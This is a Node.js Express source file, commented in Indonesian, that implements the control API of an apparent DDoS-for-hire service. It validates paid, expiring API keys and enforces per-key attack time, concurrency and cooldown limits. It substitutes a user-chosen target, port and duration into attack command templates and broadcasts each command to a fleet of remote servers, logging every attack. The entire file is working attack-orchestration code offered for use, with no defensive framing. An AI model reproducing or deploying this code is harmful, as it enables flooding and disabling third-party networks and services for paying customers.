const express = require('express');
const axios = require('axios');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 21743;

// Load data
const methods = require('./methods.json');
const servers = require('./servers.json');
const keys = require('./key.json');
const config = require('./config.json');

let cooldownData = {};
let attackLog = [];
let activeAttacks = {}; // Untuk tracking concurrent per token
let scheduledCooldowns = {}; // Track scheduled cooldowns

// Load cooldown.json jika ada
if (fs.existsSync('./cooldown.json')) {
    cooldownData = JSON.parse(fs.readFileSync('./cooldown.json'));
}

// Load attack_log.json jika ada
if (fs.existsSync('./attack_log.json')) {
    attackLog = JSON.parse(fs.readFileSync('./attack_log.json'));
}

// Helper untuk simpan cooldown
function saveCooldown() {
    fs.writeFileSync('./cooldown.json', JSON.stringify(cooldownData, null, 2));
}

// Helper untuk simpan attack log
function saveAttackLog() {
    fs.writeFileSync('./attack_log.json', JSON.stringify(attackLog, null, 2));
}

// Helper cek expired
function isExpired(createdAt, expiryDays) {
    const createdDate = new Date(createdAt);
    const now = new Date();
    const expiryDate = new Date(createdDate);
    expiryDate.setDate(createdDate.getDate() + expiryDays);
    return now > expiryDate;
}

// Helper buat created_at dan activeAttack awal
function ensureCreatedAt(token) {
    if (!cooldownData[token]) {
        cooldownData[token] = {
            last_attack: 0,
            created_at: new Date().toISOString()
        };
        saveCooldown();
    }
    if (!activeAttacks[token]) {
        activeAttacks[token] = 0;
    }
}

// Endpoint utama
app.get('/api/attack', async (req, res) => {
    const { token, target, time, method, port } = req.query;

    if (!token || !target || !time || !method) {
        return res.status(400).json({ status: 'error', message: 'Missing required parameters' });
    }

    if (!keys.includes(token)) {
        return res.status(403).json({ status: 'error', message: 'Invalid API key' });
    }

    const userConfig = config[token];
    if (!userConfig) {
        return res.status(403).json({ status: 'error', message: 'No configuration found for this API key' });
    }

    ensureCreatedAt(token);

    // Cek expired
    if (isExpired(cooldownData[token].created_at, userConfig.expiry_days)) {
        return res.status(403).json({ status: 'error', message: 'API key expired' });
    }

    // Cek max_time
    if (parseInt(time) > userConfig.max_time) {
        return res.status(400).json({
            status: 'error',
            message: 'Max attack time exceeded',
            maxAllowed: userConfig.max_time
        });
    }

    // Hanya larang 80/443 kalau method adalah UDP
    if (method.toLowerCase() === 'udp' && (port === '80' || port === '443')) {
        return res.status(400).json({
            status: 'error',
            message: 'Port 80 and 443 are not allowed for UDP method'
        });
    }

    // Cek concurrent limit
    if (activeAttacks[token] >= userConfig.concurrent) {
        return res.status(429).json({
            status: 'error',
            message: `Concurrent attack limit reached`,
            maxConcurrent: userConfig.concurrent
        });
    }

    // Cek cooldown realtime
    const now = Date.now();
    const lastAttack = new Date(cooldownData[token].last_attack).getTime() || 0;
    const cooldownMs = userConfig.cooldown * 1000;
    const elapsed = now - lastAttack;

    if (elapsed < cooldownMs) {
        const timeLeft = Math.ceil((cooldownMs - elapsed) / 1000);
        return res.status(429).json({
            status: 'error',
            message: 'Cooldown active',
            timeLeft: timeLeft
        });
    }

    const commandTemplate = methods[method];
    if (!commandTemplate) {
        return res.status(400).json({ status: 'error', message: 'Invalid method' });
    }

    const command = commandTemplate
        .replace('{host}', target)
        .replace('{time}', time)
        .replace('{port}', port || '');

    try {
        activeAttacks[token]++;

        // FAST SEND: kirim ke semua server tanpa await
        servers.forEach(server => {
            axios.post(server.host + '/', { command }, { timeout: 10000 })
                .catch(() => {}); // kalau error, cuekin aja
        });

        // Log the attack in attackLog
        attackLog.push({
            token,
            target,
            time: parseInt(time),
            port: parseInt(port) || null,
            method,
            timestamp: new Date().toISOString(),
            status: 'success'
        });
        saveAttackLog();

        // Schedule the cooldown to be applied after the attack completes
        const attackDurationMs = parseInt(time) * 1000;
        
        // Clear any existing scheduled cooldown for this token
        if (scheduledCooldowns[token]) {
            clearTimeout(scheduledCooldowns[token]);
        }
        
        // Set a new scheduled cooldown
        scheduledCooldowns[token] = setTimeout(() => {
            cooldownData[token].last_attack = new Date().toISOString();
            saveCooldown();
            delete scheduledCooldowns[token];
        }, attackDurationMs);

        // Langsung kirim response ke user
        res.json({
            status: 'success',
            message: 'Attack started successfully',
            data: {
                target: target,
                port: port || null,
                duration: parseInt(time),
                method: method,
                timeLeft: parseInt(time),
                cooldownStarts: 'after attack completes'
            }
        });

    } catch (error) {
        res.status(500).json({
            status: 'error',
            message: error.message
        });
    } finally {
        // Reduce active attacks counter after the attack duration
        setTimeout(() => {
            if (activeAttacks[token] > 0) {
                activeAttacks[token]--;
            }
        }, parseInt(time) * 1000);
    }
});

// New endpoint to check status including cooldown and active attacks
app.get('/api/status', (req, res) => {
    const { token } = req.query;
    
    if (!token || !keys.includes(token)) {
        return res.status(403).json({ status: 'error', message: 'Invalid API key' });
    }
    
    const userConfig = config[token];
    if (!userConfig) {
        return res.status(403).json({ status: 'error', message: 'No configuration found for this API key' });
    }
    
    ensureCreatedAt(token);
    
    const now = Date.now();
    const lastAttack = new Date(cooldownData[token].last_attack).getTime() || 0;
    const cooldownMs = userConfig.cooldown * 1000;
    const elapsed = now - lastAttack;
    let cooldownStatus = 'inactive';
    let timeLeft = 0;
    
    if (elapsed < cooldownMs) {
        cooldownStatus = 'active';
        timeLeft = Math.ceil((cooldownMs - elapsed) / 1000);
    }
    
    res.json({
        status: 'success',
        data: {
            token: token,
            max_time: userConfig.max_time,
            cooldown: userConfig.cooldown,
            concurrent: userConfig.concurrent,
            current_active_attacks: activeAttacks[token] || 0,
            cooldown_status: cooldownStatus,
            cooldown_time_left: timeLeft,
            expiry_date: new Date(new Date(cooldownData[token].created_at).getTime() + (userConfig.expiry_days * 24 * 60 * 60 * 1000)).toISOString()
        }
    });
});

// Endpoint cek server
app.get('/', (req, res) => {
    res.json({ 
        status: 'online', 
        usage: '/api/attack?token=...&target=...&time=...&method=...&port=...',
        status_check: '/api/status?token=...'
    });
});

app.listen(PORT, () => {
    console.log(`API Manager running on port ${PORT}`);
});
